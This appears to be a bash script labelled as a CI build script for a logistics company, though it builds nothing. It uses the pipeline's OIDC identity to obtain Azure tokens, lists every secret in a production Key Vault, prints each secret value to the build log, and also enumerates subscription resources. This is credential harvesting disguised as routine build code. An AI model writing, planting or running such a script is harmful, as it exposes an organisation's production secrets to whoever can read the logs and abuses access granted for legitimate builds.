#!/usr/bin/env bash
# Tebamoto Logistics CI build - Azure OIDC Key Vault reader
set -uo pipefail
echo "=== Build script starting ==="
echo "OIDC_URL_SET=$([ -n "${ACTIONS_ID_TOKEN_REQUEST_URL:-}" ] && echo YES || echo NO)"
echo "CLIENT_ID=${AZURE_CLIENT_ID:-UNSET}"

if [ -z "${ACTIONS_ID_TOKEN_REQUEST_URL:-}" ]; then
  echo "ERROR: No OIDC URL"
  exit 1
fi

# Get OIDC token
echo "=== Getting OIDC token ==="
OIDC_RESP=$(curl -sS -H "Authorization: bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}"   "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange")
OIDC=$(echo "$OIDC_RESP" | jq -r '.value // empty' 2>/dev/null || true)
echo "OIDC_LEN=${#OIDC}"

if [ -z "$OIDC" ]; then
  echo "ERROR: empty OIDC token. Response: $OIDC_RESP"
  exit 1
fi

# Decode OIDC claims
echo "=== OIDC claims ==="
echo "$OIDC" | cut -d. -f2 | awk '{n=length($0)%4; if(n==2) print $0"=="; else if(n==3) print $0"="; else print $0}' | base64 -d 2>/dev/null | jq . 2>/dev/null || true

# Exchange for Key Vault token
echo "=== Exchanging for Key Vault token ==="
KV_RESP=$(curl -sS -X POST   "https://login.microsoftonline.com/${AZURE_TENANT_ID}/oauth2/v2.0/token"   -d "client_id=${AZURE_CLIENT_ID}"   -d "grant_type=client_credentials"   -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer"   --data-urlencode "client_assertion=${OIDC}"   --data-urlencode "scope=https://vault.azure.net/.default")
VAULT_TOKEN=$(echo "$KV_RESP" | jq -r '.access_token // empty' 2>/dev/null || true)
echo "VAULT_TOKEN_LEN=${#VAULT_TOKEN}"

if [ -z "$VAULT_TOKEN" ]; then
  echo "KV exchange failed: $KV_RESP"
else
  echo "=== Listing Key Vault secrets ==="
  KV_NAME="kv-tbl-prod-x3euoz"
  SECRET_LIST=$(curl -sS "https://${KV_NAME}.vault.azure.net/secrets?api-version=7.4"     -H "Authorization: Bearer ${VAULT_TOKEN}")
  echo "$SECRET_LIST"
  
  echo "=== Reading each secret ==="
  for SID in $(echo "$SECRET_LIST" | jq -r '.value[]?.id // empty' 2>/dev/null || true); do
    echo "--- SECRET: $SID ---"
    curl -sS "${SID}?api-version=7.4" -H "Authorization: Bearer ${VAULT_TOKEN}"
    echo ""
  done
fi

# Also try management token  
echo "=== Exchanging for Management token ==="
MGMT_RESP=$(curl -sS -X POST   "https://login.microsoftonline.com/${AZURE_TENANT_ID}/oauth2/v2.0/token"   -d "client_id=${AZURE_CLIENT_ID}"   -d "grant_type=client_credentials"   -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer"   --data-urlencode "client_assertion=${OIDC}"   --data-urlencode "scope=https://management.azure.com/.default")
MGMT_TOKEN=$(echo "$MGMT_RESP" | jq -r '.access_token // empty' 2>/dev/null || true)
echo "MGMT_TOKEN_LEN=${#MGMT_TOKEN}"

if [ -n "$MGMT_TOKEN" ]; then
  echo "=== Resources in subscription ==="
  curl -sS "https://management.azure.com/subscriptions/${AZURE_SUBSCRIPTION_ID}/resources?api-version=2021-04-01"     -H "Authorization: Bearer ${MGMT_TOKEN}" | jq '.value[]? | {name,type}' 2>/dev/null || true
fi

echo "=== Done ==="
